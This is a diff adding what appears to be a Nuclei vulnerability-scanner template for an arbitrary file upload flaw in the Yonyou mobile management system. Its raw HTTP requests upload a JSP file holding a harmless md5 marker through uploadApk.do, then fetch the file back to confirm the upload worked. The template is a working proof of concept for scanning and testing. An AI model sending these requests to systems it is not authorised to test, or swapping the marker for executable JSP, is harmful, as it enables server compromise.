@@ -1,0 +1,52 @@
+id: yy-mobile-management-system-file-upload
+info:
+  name: 用友-移动管理系统 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+        Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
+        Content-Type: application/msword
+
+        {{md5('123')}}
+
+        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "status"
+          - "2"
+      - type: word
+        part: header
+        words:
+          - "application/json;charset=UTF-8"
+  - raw:
+      - |
+        GET /maupload/apk/a.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5('123')}}"
+      - type: word
+        part: header
+        words:
+          - "text/html;charset=ISO-8859-1"
